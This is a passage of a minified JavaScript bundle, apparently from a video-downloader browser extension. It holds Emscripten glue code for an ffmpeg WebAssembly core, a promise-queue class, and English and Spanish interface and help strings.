                                    return date.tm_wday;
                                },
                                "%W": function (date) {
                                    var janFirst = new Date(date.tm_year, 0, 1),
                                        firstMonday = 1 === janFirst.getDay() ? janFirst : __addDays(janFirst, 0 === janFirst.getDay() ? 1 : 7 - janFirst.getDay() + 1),
                                        endDate = new Date(date.tm_year + 1900, date.tm_mon, date.tm_mday);
                                    if (compareByDay(firstMonday, endDate) < 0) {
                                        var februaryFirstUntilEndMonth = __arraySum(__isLeapYear(endDate.getFullYear()) ? __MONTH_DAYS_LEAP : __MONTH_DAYS_REGULAR, endDate.getMonth() - 1) - 31,
                                            days = 31 - firstMonday.getDate() + februaryFirstUntilEndMonth + endDate.getDate();
                                        return leadingNulls(Math.ceil(days / 7), 2);
                                    }
                                    return 0 === compareByDay(firstMonday, janFirst) ? "01" : "00";
                                },
                                "%y": function (date) {
                                    return (date.tm_year + 1900).toString().substring(2);
                                },
                                "%Y": function (date) {
                                    return date.tm_year + 1900;
                                },
                                "%z": function (date) {
                                    var off = date.tm_gmtoff,
                                        ahead = off >= 0;
                                    return (off = ((off = Math.abs(off) / 60) / 60) * 100 + (off % 60)), (ahead ? "+" : "-") + String("0000" + off).slice(-4);
                                },
                                "%Z": function (date) {
                                    return date.tm_zone;
                                },
                                "%%": function () {
                                    return "%";
                                },
                            };
                            for (var rule in EXPANSION_RULES_2) pattern.includes(rule) && (pattern = pattern.replace(new RegExp(rule, "g"), EXPANSION_RULES_2[rule](date)));
                            var bytes = intArrayFromString(pattern, !1);
                            return bytes.length > maxsize ? 0 : (writeArrayToMemory(bytes, s), bytes.length - 1);
                        }
                        function _time(ptr) {
                            var ret = (Date.now() / 1e3) | 0;
                            return ptr && (HEAP32[ptr >> 2] = ret), ret;
                        }
                        var FSNode = function (parent, name, mode, rdev) {
                                parent || (parent = this),
                                    (this.parent = parent),
                                    (this.mount = parent.mount),
                                    (this.mounted = null),
                                    (this.id = FS.nextInode++),
                                    (this.name = name),
                                    (this.mode = mode),
                                    (this.node_ops = {}),
                                    (this.stream_ops = {}),
                                    (this.rdev = rdev);
                            },
                            readMode = 365,
                            writeMode = 146;
                        function intArrayFromString(stringy, dontAddNull, length) {
                            var len = length > 0 ? length : lengthBytesUTF8(stringy) + 1,
                                u8array = new Array(len),
                                numBytesWritten = stringToUTF8Array(stringy, u8array, 0, u8array.length);
                            return dontAddNull && (u8array.length = numBytesWritten), u8array;
                        }
                        Object.defineProperties(FSNode.prototype, {
                            read: {
                                get: function () {
                                    return (this.mode & readMode) === readMode;
                                },
                                set: function (val) {
                                    val ? (this.mode |= readMode) : (this.mode &= ~readMode);
                                },
                            },
                            write: {
                                get: function () {
                                    return (this.mode & writeMode) === writeMode;
                                },
                                set: function (val) {
                                    val ? (this.mode |= writeMode) : (this.mode &= ~writeMode);
                                },
                            },
                            isFolder: {
                                get: function () {
                                    return FS.isDir(this.mode);
                                },
                            },
                            isDevice: {
                                get: function () {
                                    return FS.isChrdev(this.mode);
                                },
                            },
                        }),
                            (FS.FSNode = FSNode),
                            FS.staticInit();
                        var calledRun,
                            asmLibraryArg = {
                                b: ___assert_fail,
                                ma: ___clock_gettime,
                                w: ___cxa_atexit,
                                da: ___gmtime_r,
                                ca: ___localtime_r,
                                oa: ___sys__newselect,
                                T: ___sys_accept4,
                                qa: ___sys_access,
                                W: ___sys_bind,
                                V: ___sys_connect,
                                l: ___sys_fcntl64,
                                wa: ___sys_fstat64,
                                ha: ___sys_getdents64,
                                R: ___sys_getpeername,
                                ka: ___sys_getrusage,
                                S: ___sys_getsockname,
                                O: ___sys_getsockopt,
                                C: ___sys_ioctl,
                                U: ___sys_listen,
                                xa: ___sys_lstat64,
                                ya: ___sys_mkdir,
                                fa: ___sys_mmap2,
                                ga: ___sys_mprotect,
                                ea: ___sys_munmap,
                                ta: ___sys_nice,
                                E: ___sys_open,
                                na: ___sys_poll,
                                ja: ___sys_prlimit64,
                                P: ___sys_recvfrom,
                                va: ___sys_rename,
                                ra: ___sys_rmdir,
                                Q: ___sys_sendto,
                                ia: ___sys_setrlimit,
                                N: ___sys_setsockopt,
                                X: ___sys_shutdown,
                                A: ___sys_socket,
                                F: ___sys_stat64,
                                la: ___sys_uname,
                                sa: ___sys_unlink,
                                _: __emscripten_throw_longjmp,
                                a: _abort,
                                ua: _clock,
                                za: _clock_gettime,
                                I: _dlopen,
                                Ba: _dlsym,
                                pa: _emscripten_get_heap_max,
                                Y: _emscripten_memcpy_big,
                                Z: _emscripten_resize_heap,
                                ba: _emscripten_thread_sleep,
                                $: _environ_get,
                                aa: _environ_sizes_get,
                                s: _exit,
                                t: _fd_close,
                                B: _fd_fdstat_get,
                                D: _fd_read,
                                J: _fd_seek,
                                v: _fd_write,
                                q: _gai_strerror,
                                c: _getTempRet0,
                                o: _getaddrinfo,
                                n: _getnameinfo,
                                g: _gettimeofday,
                                j: _gmtime_r,
                                Da: invoke_i,
                                Ca: invoke_ii,
                                e: invoke_iii,
                                u: invoke_iiii,
                                y: invoke_iiiii,
                                G: invoke_iiiiii,
                                x: invoke_iiiiiiiii,
                                L: invoke_iiiijj,
                                K: invoke_iij,
                                m: invoke_vi,
                                p: invoke_vii,
                                f: invoke_viiii,
                                Aa: invoke_viiiiii,
                                H: invoke_viiiiiiii,
                                M: invoke_vijjjid,
                                i: _localtime_r,
                                z: _mktime,
                                d: _setTempRet0,
                                r: _signal,
                                h: _strftime,
                                k: _time,
                            },
                            _free =
                                (createWasm(),
                                (Module.___wasm_call_ctors = function () {
                                    return (Module.___wasm_call_ctors = Module.asm.Fa).apply(null, arguments);
                                }),
                                (Module._free = function () {
                                    return (_free = Module._free = Module.asm.Ga).apply(null, arguments);
                                })),
                            _memset = (Module._memset = function () {
                                return (_memset = Module._memset = Module.asm.Ha).apply(null, arguments);
                            }),
                            _malloc = (Module._malloc = function () {
                                return (_malloc = Module._malloc = Module.asm.Ia).apply(null, arguments);
                            }),
                            ___errno_location = (Module.___errno_location = function () {
                                return (___errno_location = Module.___errno_location = Module.asm.Ka).apply(null, arguments);
                            }),
                            _memalign =
                                ((Module._fflush = function () {
                                    return (Module._fflush = Module.asm.La).apply(null, arguments);
                                }),
                                (Module._memalign = function () {
                                    return (_memalign = Module._memalign = Module.asm.Ma).apply(null, arguments);
                                })),
                            _ntohs = (Module._ntohs = function () {
                                return (_ntohs = Module._ntohs = Module.asm.Na).apply(null, arguments);
                            }),
                            _htons = (Module._htons = function () {
                                return (_htons = Module._htons = Module.asm.Oa).apply(null, arguments);
                            }),
                            _htonl =
                                ((Module._main = function () {
                                    return (Module._main = Module.asm.Pa).apply(null, arguments);
                                }),
                                (Module._htonl = function () {
                                    return (_htonl = Module._htonl = Module.asm.Qa).apply(null, arguments);
                                })),
                            __get_tzname = (Module.__get_tzname = function () {
                                return (__get_tzname = Module.__get_tzname = Module.asm.Ra).apply(null, arguments);
                            }),
                            __get_daylight = (Module.__get_daylight = function () {
                                return (__get_daylight = Module.__get_daylight = Module.asm.Sa).apply(null, arguments);
                            }),
                            __get_timezone = (Module.__get_timezone = function () {
                                return (__get_timezone = Module.__get_timezone = Module.asm.Ta).apply(null, arguments);
                            }),
                            stackSave = (Module.stackSave = function () {
                                return (stackSave = Module.stackSave = Module.asm.Ua).apply(null, arguments);
                            }),
                            stackRestore = (Module.stackRestore = function () {
                                return (stackRestore = Module.stackRestore = Module.asm.Va).apply(null, arguments);
                            }),
                            stackAlloc = (Module.stackAlloc = function () {
                                return (stackAlloc = Module.stackAlloc = Module.asm.Wa).apply(null, arguments);
                            }),
                            _setThrew = (Module._setThrew = function () {
                                return (_setThrew = Module._setThrew = Module.asm.Xa).apply(null, arguments);
                            }),
                            dynCall_vijjjid = (Module.dynCall_vijjjid = function () {
                                return (dynCall_vijjjid = Module.dynCall_vijjjid = Module.asm.Ya).apply(null, arguments);
                            }),
                            dynCall_iiiijj = (Module.dynCall_iiiijj = function () {
                                return (dynCall_iiiijj = Module.dynCall_iiiijj = Module.asm.Za).apply(null, arguments);
                            }),
                            dynCall_iij = (Module.dynCall_iij = function () {
                                return (dynCall_iij = Module.dynCall_iij = Module.asm._a).apply(null, arguments);
                            });
                        function invoke_iii(index, a1, a2) {
                            var sp = stackSave();
                            try {
                                return wasmTable.get(index)(a1, a2);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_vi(index, a1) {
                            var sp = stackSave();
                            try {
                                wasmTable.get(index)(a1);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_viiii(index, a1, a2, a3, a4) {
                            var sp = stackSave();
                            try {
                                wasmTable.get(index)(a1, a2, a3, a4);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_vii(index, a1, a2) {
                            var sp = stackSave();
                            try {
                                wasmTable.get(index)(a1, a2);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_iiiii(index, a1, a2, a3, a4) {
                            var sp = stackSave();
                            try {
                                return wasmTable.get(index)(a1, a2, a3, a4);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_iiiiiiiii(index, a1, a2, a3, a4, a5, a6, a7, a8) {
                            var sp = stackSave();
                            try {
                                return wasmTable.get(index)(a1, a2, a3, a4, a5, a6, a7, a8);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_i(index) {
                            var sp = stackSave();
                            try {
                                return wasmTable.get(index)();
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_ii(index, a1) {
                            var sp = stackSave();
                            try {
                                return wasmTable.get(index)(a1);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_iiii(index, a1, a2, a3) {
                            var sp = stackSave();
                            try {
                                return wasmTable.get(index)(a1, a2, a3);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_viiiiiiii(index, a1, a2, a3, a4, a5, a6, a7, a8) {
                            var sp = stackSave();
                            try {
                                wasmTable.get(index)(a1, a2, a3, a4, a5, a6, a7, a8);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_iiiiii(index, a1, a2, a3, a4, a5) {
                            var sp = stackSave();
                            try {
                                return wasmTable.get(index)(a1, a2, a3, a4, a5);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_viiiiii(index, a1, a2, a3, a4, a5, a6) {
                            var sp = stackSave();
                            try {
                                wasmTable.get(index)(a1, a2, a3, a4, a5, a6);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_vijjjid(index, a1, a2, a3, a4, a5, a6, a7, a8, a9) {
                            var sp = stackSave();
                            try {
                                dynCall_vijjjid(index, a1, a2, a3, a4, a5, a6, a7, a8, a9);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_iiiijj(index, a1, a2, a3, a4, a5, a6, a7) {
                            var sp = stackSave();
                            try {
                                return dynCall_iiiijj(index, a1, a2, a3, a4, a5, a6, a7);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function invoke_iij(index, a1, a2, a3) {
                            var sp = stackSave();
                            try {
                                return dynCall_iij(index, a1, a2, a3);
                            } catch (e) {
                                if ((stackRestore(sp), e !== e + 0 && "longjmp" !== e)) throw e;
                                _setThrew(1, 0);
                            }
                        }
                        function ExitStatus(status) {
                            (this.name = "ExitStatus"), (this.message = "Program terminated with exit(" + status + ")"), (this.status = status);
                        }
                        function callMain(args) {
                            var entryFunction = Module._main,
                                argc = (args = args || []).length + 1,
                                argv = stackAlloc(4 * (argc + 1));
                            HEAP32[argv >> 2] = allocateUTF8OnStack(thisProgram);
                            for (var i = 1; i < argc; i++) HEAP32[(argv >> 2) + i] = allocateUTF8OnStack(args[i - 1]);
                            HEAP32[(argv >> 2) + argc] = 0;
                            try {
                                exit(entryFunction(argc, argv), !0);
                            } catch (e) {
                                if (e instanceof ExitStatus) return;
                                if ("unwind" == e) return;
                                var toLog = e;
                                e && "object" == typeof e && e.stack && (toLog = [e, e.stack]), err("exception thrown: " + toLog), quit_(1, e);
                            }
                        }
                        function run(args) {
                            function doRun() {
                                calledRun ||
                                    ((calledRun = !0),
                                    (Module.calledRun = !0),
                                    ABORT || (initRuntime(), preMain(), readyPromiseResolve(Module), Module.onRuntimeInitialized && Module.onRuntimeInitialized(), shouldRunNow && callMain(args), postRun()));
                            }
                            (args = args || arguments_),
                                runDependencies > 0 ||
                                    (preRun(),
                                    runDependencies > 0 ||
                                        (Module.setStatus
                                            ? (Module.setStatus("Running..."),
                                              setTimeout(function () {
                                                  setTimeout(function () {
                                                      Module.setStatus("");
                                                  }, 1),
                                                      doRun();
                                              }, 1))
                                            : doRun()));
                        }
                        function exit(status, implicit) {
                            (implicit && keepRuntimeAlive() && 0 === status) || (keepRuntimeAlive() || (exitRuntime(), Module.onExit && Module.onExit(status), (ABORT = !0)), quit_(status, new ExitStatus(status)));
                        }
                        if (
                            ((Module._ff_h264_cabac_tables = 2553292),
                            (Module.ccall = ccall),
                            (Module.cwrap = cwrap),
                            (Module.setValue = setValue),
                            (Module.writeAsciiToMemory = writeAsciiToMemory),
                            (Module.FS = FS),
                            (dependenciesFulfilled = function runCaller() {
                                calledRun || run(), calledRun || (dependenciesFulfilled = runCaller);
                            }),
                            (Module.run = run),
                            Module.preInit)
                        )
                            for ("function" == typeof Module.preInit && (Module.preInit = [Module.preInit]); Module.preInit.length > 0; ) Module.preInit.pop()();
                        var shouldRunNow = !1;
                        return Module.noInitialRun && (shouldRunNow = !1), run(), createFFmpegCore.ready;
                    });
            module.exports = createFFmpegCore;
        }.call(this, "/index.js", __webpack_require__(7), "/", __webpack_require__(6).Buffer));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        Object.defineProperty(exports, "__esModule", { value: !0 });
        const EventEmitter = __webpack_require__(67),
            p_timeout_1 = __webpack_require__(289),
            priority_queue_1 = __webpack_require__(291),
            empty = () => {},
            timeoutError = new p_timeout_1.TimeoutError();
        exports.default = class extends EventEmitter {
            constructor(options) {
                var _a, _b, _c, _d;
                if (
                    (super(),
                    (this._intervalCount = 0),
                    (this._intervalEnd = 0),
                    (this._pendingCount = 0),
                    (this._resolveEmpty = empty),
                    (this._resolveIdle = empty),
                    !(
                        "number" == typeof (options = Object.assign({ carryoverConcurrencyCount: !1, intervalCap: 1 / 0, interval: 0, concurrency: 1 / 0, autoStart: !0, queueClass: priority_queue_1.default }, options)).intervalCap &&
                        options.intervalCap >= 1
                    ))
                )
                    throw new TypeError(
                        `Expected \`intervalCap\` to be a number from 1 and up, got \`${
                            null !== (_b = null === (_a = options.intervalCap) || void 0 === _a ? void 0 : _a.toString()) && void 0 !== _b ? _b : ""
                        }\` (${typeof options.intervalCap})`
                    );
                if (void 0 === options.interval || !(Number.isFinite(options.interval) && options.interval >= 0))
                    throw new TypeError(
                        `Expected \`interval\` to be a finite number >= 0, got \`${null !== (_d = null === (_c = options.interval) || void 0 === _c ? void 0 : _c.toString()) && void 0 !== _d ? _d : ""}\` (${typeof options.interval})`
                    );
                (this._carryoverConcurrencyCount = options.carryoverConcurrencyCount),
                    (this._isIntervalIgnored = options.intervalCap === 1 / 0 || 0 === options.interval),
                    (this._intervalCap = options.intervalCap),
                    (this._interval = options.interval),
                    (this._queue = new options.queueClass()),
                    (this._queueClass = options.queueClass),
                    (this.concurrency = options.concurrency),
                    (this._timeout = options.timeout),
                    (this._throwOnTimeout = !0 === options.throwOnTimeout),
                    (this._isPaused = !1 === options.autoStart);
            }
            get _doesIntervalAllowAnother() {
                return this._isIntervalIgnored || this._intervalCount < this._intervalCap;
            }
            get _doesConcurrentAllowAnother() {
                return this._pendingCount < this._concurrency;
            }
            _next() {
                this._pendingCount--, this._tryToStartAnother(), this.emit("next");
            }
            _resolvePromises() {
                this._resolveEmpty(), (this._resolveEmpty = empty), 0 === this._pendingCount && (this._resolveIdle(), (this._resolveIdle = empty), this.emit("idle"));
            }
            _onResumeInterval() {
                this._onInterval(), this._initializeIntervalIfNeeded(), (this._timeoutId = void 0);
            }
            _isIntervalPaused() {
                const now = Date.now();
                if (void 0 === this._intervalId) {
                    const delay = this._intervalEnd - now;
                    if (!(delay < 0))
                        return (
                            void 0 === this._timeoutId &&
                                (this._timeoutId = setTimeout(() => {
                                    this._onResumeInterval();
                                }, delay)),
                            !0
                        );
                    this._intervalCount = this._carryoverConcurrencyCount ? this._pendingCount : 0;
                }
                return !1;
            }
            _tryToStartAnother() {
                if (0 === this._queue.size) return this._intervalId && clearInterval(this._intervalId), (this._intervalId = void 0), this._resolvePromises(), !1;
                if (!this._isPaused) {
                    const canInitializeInterval = !this._isIntervalPaused();
                    if (this._doesIntervalAllowAnother && this._doesConcurrentAllowAnother) return this.emit("active"), this._queue.dequeue()(), canInitializeInterval && this._initializeIntervalIfNeeded(), !0;
                }
                return !1;
            }
            _initializeIntervalIfNeeded() {
                this._isIntervalIgnored ||
                    void 0 !== this._intervalId ||
                    ((this._intervalId = setInterval(() => {
                        this._onInterval();
                    }, this._interval)),
                    (this._intervalEnd = Date.now() + this._interval));
            }
            _onInterval() {
                0 === this._intervalCount && 0 === this._pendingCount && this._intervalId && (clearInterval(this._intervalId), (this._intervalId = void 0)),
                    (this._intervalCount = this._carryoverConcurrencyCount ? this._pendingCount : 0),
                    this._processQueue();
            }
            _processQueue() {
                for (; this._tryToStartAnother(); );
            }
            get concurrency() {
                return this._concurrency;
            }
            set concurrency(newConcurrency) {
                if (!("number" == typeof newConcurrency && newConcurrency >= 1)) throw new TypeError(`Expected \`concurrency\` to be a number from 1 and up, got \`${newConcurrency}\` (${typeof newConcurrency})`);
                (this._concurrency = newConcurrency), this._processQueue();
            }
            async add(fn, options = {}) {
                return new Promise((resolve, reject) => {
                    this._queue.enqueue(async () => {
                        this._pendingCount++, this._intervalCount++;
                        try {
                            const operation =
                                void 0 === this._timeout && void 0 === options.timeout
                                    ? fn()
                                    : p_timeout_1.default(Promise.resolve(fn()), void 0 === options.timeout ? this._timeout : options.timeout, () => {
                                          (void 0 === options.throwOnTimeout ? this._throwOnTimeout : options.throwOnTimeout) && reject(timeoutError);
                                      });
                            resolve(await operation);
                        } catch (error) {
                            reject(error);
                        }
                        this._next();
                    }, options),
                        this._tryToStartAnother(),
                        this.emit("add");
                });
            }
            async addAll(functions, options) {
                return Promise.all(functions.map(async (function_) => this.add(function_, options)));
            }
            start() {
                return this._isPaused ? ((this._isPaused = !1), this._processQueue(), this) : this;
            }
            pause() {
                this._isPaused = !0;
            }
            clear() {
                this._queue = new this._queueClass();
            }
            async onEmpty() {
                if (0 !== this._queue.size)
                    return new Promise((resolve) => {
                        const existingResolve = this._resolveEmpty;
                        this._resolveEmpty = () => {
                            existingResolve(), resolve();
                        };
                    });
            }
            async onIdle() {
                if (0 !== this._pendingCount || 0 !== this._queue.size)
                    return new Promise((resolve) => {
                        const existingResolve = this._resolveIdle;
                        this._resolveIdle = () => {
                            existingResolve(), resolve();
                        };
                    });
            }
            get size() {
                return this._queue.size;
            }
            sizeBy(options) {
                return this._queue.filter(options).length;
            }
            get pending() {
                return this._pendingCount;
            }
            get isPaused() {
                return this._isPaused;
            }
            get timeout() {
                return this._timeout;
            }
            set timeout(milliseconds) {
                this._timeout = milliseconds;
            }
        };
    },
    function (module) {
        module.exports = JSON.parse(
            '{"language":"Language","auto_detect":"Auto Detect","download":"Download","live_stream":"Live Stream","live_stream_tooltip":"You can\'t download Live Streams yet, but we are working on it :)","protected":"Protected","protected_tooltip":"You can\'t download this video, it\'s protected by copyright.","premiere":"Premiere","premiere_tooltip":"There is nothing to download yet :)","return_to_the_previous_screen":"Back","settings":{"title":"Settings","show_formats_available_via_desktop_client":"Show formats available via {{desktopClientName}}","show_formats_required_online_conversion":"Show formats required online conversion","show_webm":"Show video in WebM format","show_snapshot_button":"Show the video ​snapshot button","warn_before_converting":"Warn before converting","title_app_button_style":"Button style","app_button_style_modern":"Modern (interface appears on mouse over)","app_button_style_classic":"Classic (interface appears on click)","display_qr_codes":"Display QR Codes"},"confirm_conversion_title":"The selected file format requires conversion!","confirm_conversion_message":"Conversion actively uses hardware resources, this may cause a temporary decrease in the speed of the browser, including in other tabs.","do_not_show_on_load":"Don\'t show on load","cancel":"Cancel","continue":"Continue","formats_for_download":"Formats for download","all_formats_for_download":"All formats for download","more_formats":"More formats","conversion_required":"сonversion required","conversion_time":"сonversion ~{%conversionTime%}","download_via_web_portal":"Download the required format via {{webPortalHostname}}","download_via_web_portal_tooltip":"Download via {{webPortalHostname}}","download_using_desktop_client":"Download the required format using {{desktopClientName}}","download_using_desktop_client_tooltip":"Download using {{desktopClientName}}","qr_code_tooltip":"Get QR Code","copy_link_to_clipboard_tooltip":"Copy link to clipboard","copy_link_to_clipboard_notification_message":"Link copied to clipboard","active_download_warning_notification_message":"Everything\'s under control!","active_download_warning_notification_description":"You have left the page with an active download, it will continue in the background.","cancel_download":"Cancel download/conversion","take_screenshot_tooltip":"Take screenshot","drop_us_a_line":"Didn\'t find an answer? Drop us a line ;)","help":"Help","help_articles":[{"title":"How to download?","article":"You can download the default format by clicking on the <b>{%extensionName%}</b> button below the video. Also you can choose the desired format in the drop-down list."},{"title":"Which video format should I choose?","article":"The best quality is available in <b>FullHD (1080p)</b>, <b>2K (1440p)</b>, <b>4K (2160p)</b> and <b>8K (4320p)</b>. The general recommendation is that the higher your screen resolution the better the video quality should be. However, you have to consider other factors as well: download speed, amount of free space, and the device performance during playback."},{"title":"Why does a browser/computer freezes while downloading?","article":"The browser/computer should not completely freeze! If this happens please report it through the feedback form, indicating the video link. Unfortunately, some video formats cannot be downloaded from {%onlineVideoPlatform%} directly. Therefore, we have added the possibility to convert small videos online to the desired format in <b>{%extensionName%}</b>. In some cases this process uses computer resources too actively."},{"title":"Why I can\'t download a video in the desired format directly?","article":"Some video file formats can not be downloaded directly due to certain technical properties of {%onlineVideoPlatform%}. Hence, the <b>{%extensionName%}</b> has an additional feature to convert online short videos into the desired format. Large videos (longer and/or high quality) require many resources for online conversion, which sometimes can freeze your browser/computer. Therefore, it is suggested to upload these videos through the <b><a href=\\"{%desktopClientUrl%}\\" target=\\\\\\"_blank\\\\\\">{%desktopClientName%} for Windows</a></b>."},{"title":"How can I get a video/audio download link?","article":"Direct download link is available only for those formats that do not require conversion. To do so, click on the icon&nbsp;\x3c!--[img-copy]--\x3e in a line with appropriate download option, and then paste it as text where necessary."},{"title":"How to download 60 fps video?","article":"It\'s enough to choose corresponding download option, which can be identified by the icon&nbsp;\x3c!--[img-fps-60]--\x3e. However, such options are not always available. First of all, the original video must have at least 60 FPS. Also, it must be available for viewing in the {%onlineVideoPlatform%} player with 60 FPS rate."},{"title":"How to download an audio track (music) in MP3?","article":"Unfortunately, it\'s not possible to download MP3 format directly at the moment. {%onlineVideoPlatform%} does not support it, and the required online conversion is unstable. Use our <b><a href=\\"{%desktopClientUrl%}\\" target=\\\\\\"_blank\\\\\\">{%desktopClientName%} for Windows</a></b> that can convert video files to MP3. Or select any other audio format from the list (indicated by the icon&nbsp;\x3c!--[img-sound-on]--\x3e).","services":[]},{"title":"How to take a screenshot?","article":"Make sure that in the <a data-webext-page=\\"settings\\">settings</a> there is a checkbox opposite the item <b>\\"Show the video ​snapshot button\\"</b>. In the lower right corner of the player to the left of the <b>\\"Settings\\"</b> icon, the <b>\\"Take screenshot\\"</b> icon&nbsp;\x3c!--[img-camera]--\x3e should appear, by clicking on which the current frame from the video will be saved to your computer in jpeg format.","services":["gv","ok"]},{"title":"How to display the interface on click the download button, not on hover over it?","article":"You can choose a button style in the <a data-webext-page=\\"settings\\">settings</a>: <ul><li><b>modern</b> (interface appears on mouse over)</li><li><b>classic</b> (interface appears on click)</li></ul>"},{"title":"Why you need QR codes?","article":"Using QR codes you can get a direct link to video or audio on any device with a camera. Make sure the <b>\\"Display QR Codes\\"</b> item is enabled in the <a data-webext-page=\\"settings\\">{%extensionName%} settings</a>. Some download options will have a \\"Get QR Code\\" icon&nbsp;\x3c!--[img-qr-code]--\x3e, by clicking on which you will see a QR code and instructions for your phone or tablet.","services":["gv","gvOk"]}],"qr_code_title":"QR code for mobile device","qr_code_description":"It\'s easy to send the direct download link to your smartphone or tablet - just launch a QR code scanner and hover over the image above.","qr_code_error":"QR-code service is unavailabel for now. Please try again later.","show_yandex_market_adviser":"Show Yandex.Market Adviser - best deals price comparison widget","warning":"Warning!","yandex_market_adviser_notification_description":"Changes will take effect after reloading the page with the Yandex.Market Adviser widget.","social_media_sharing":{"title":"Just a moment please!","mediafile":"mediafile","mediafile_plural":"mediafiles","already_oneMediafile":"","already_moreThanOneMediafile":"already","message":"<0>With our browser extension you have {{already}} downloaded <3><0>{{downloadsCount}}</0></3> $t(social_media_sharing.mediafile) :)</0><1>To keep {{extensionName}} free we need your help - tell about us on social networks or messengers!</1>","button_ok":"Share with friends","button_cancel":"Not now","asking_for_review_by_downloads":"You\'ve successfully downloaded {{downloadsCount}} $t(social_media_sharing.mediafile).<5 /> We would be grateful for the review and <7>5 stars</7> ;)<9 />It\'s really important for development.","screenshot":"screenshot","screenshot_plural":"screenshots","asking_for_review_by_screenshots":"You\'ve successfully made {{screenshotsCount}} $t(social_media_sharing.screenshot).<5 /> We would be grateful for the review and <7>5 stars</7> ;)<9 />It\'s really important for development.","button_cancel_rate":"Not now","button_rate":"Rate","help_extension_to_get_better":"Help {{extensionName}} to get better!"},"direct_links_unavailable":"Direct links are temporarily unavailable. Try to <a data-webext-function=\\"reload\\">reload the page</a> (F5 key)","day":"d","hour":"h","minute":"min","second":"sec","reset":"Reset","download_error":"An error occurred during the file download. To return to the list of file formats available for download, click the Reset button."}'
        );
    },
    function (module) {
        module.exports = JSON.parse(
            '{"language":"Idioma","auto_detect":"Detección automática","download":"Descargar","live_stream":"Transmisión en vivo","live_stream_tooltip":"Aún no se puede descargar transmisiones en vivo, pero estamos trabajando en ello :)","premiere":"Estreno","premiere_tooltip":"Aún no hay nada que descargar :)","return_to_the_previous_screen":"Atrás","settings":{"title":"Ajustes","show_formats_available_via_desktop_client":"Mostrar formatos disponibles en {{desktopClientName}}","show_formats_required_online_conversion":"Mostrar formatos que requiren conversión en línea","show_webm":"Mostrar videos en formato WebM","show_snapshot_button":"Mostrar el botón de instantánea","warn_before_converting":"Avisar antes de convertir","title_app_button_style":"Diseño del botón","app_button_style_modern":"Moderno (interfaz aparece al pasar el ratón)","app_button_style_classic":"Clásico (interfaz aparece al hacer clic)","display_qr_codes":"Mostrar códigos QR"},"confirm_conversion_title":"¡El formato elegido requiere conversión!","confirm_conversion_message":"Conversión utiliza activamente los recursos de hardware, lo que puede causar una disminución temporal de la velocidad del navegador, incluidas otras pestañas abiertas.","do_not_show_on_load":"No mostrar durante la descarga","cancel":"Cancelar","continue":"Continuar","formats_for_download":"Formatos para descarga","all_formats_for_download":"Todos los formatos disponibles","more_formats":"Más formatos","conversion_required":"Se requiere conversión","conversion_time":"conversión ~{%conversionTime%}","download_via_web_portal":"Descargar en el formato con {{webPortalHostname}}","download_via_web_portal_tooltip":"Descargar con {{webPortalHostname}}","download_using_desktop_client":"Descargar en el formato con {{desktopClientName}}","download_using_desktop_client_tooltip":"Descargar con {{desktopClientName}}","qr_code_tooltip":"Obtener código QR","copy_link_to_clipboard_tooltip":"Copiar enlace al portapapeles","copy_link_to_clipboard_notification_message":"El enlace fue copiado en el portapapeles","active_download_warning_notification_message":"¡Todo bajo control!","active_download_warning_notification_description":"Usted abandonó la página con una descarga activa. La descarga continuará en segundo plano.","cancel_download":"Cancelar la descarga/conversión","take_screenshot_tooltip":"Tomar una captura de pantalla","drop_us_a_line":"¿No encontró la respuesta? Escríbanos ;)","help":"Ayuda","help_articles":[{"title":"¿Cómo descargar?","article":"Puede descargar el formato predeterminado simplemente haciendo clic en el botón <b>{%extensionName%}</b> debajo del vídeo. O elija el formato deseado en la lista desplegable."},{"title":"¿Qué formato de video escoger?","article":"La mejor calidad tienen los formatos <b>FullHD (1080p)</b>, <b>2K (1440p)</b>, <b>4K (2160p)</b> и <b>8K (4320p)</b>. La recomendación general es que cuanto mayor sea la resolución de su pantalla, más alta tiene que ser la calidad del video. Sin embargo, también hay que tener en cuenta otros factores: la velocidad de descarga, la cantidad de espacio libre y el rendimiento del dispositivo durante la reproducción."},{"title":"¿Por qué se congela el navegador/ordenador durante la descarga?","article":"¡El navegador/ordenador no deben bloquearse por completo! Si esto ocurrió, por favor, informe de la incidencia a través del formulario de incidencias mencionando el enlace del video. Por desgracia, algunos formatos de video no se puede descargar directamente en {%onlineVideoPlatform%}. Por eso añadimos a <b>{%extensionName%}</b> un convertidor que permite convertir 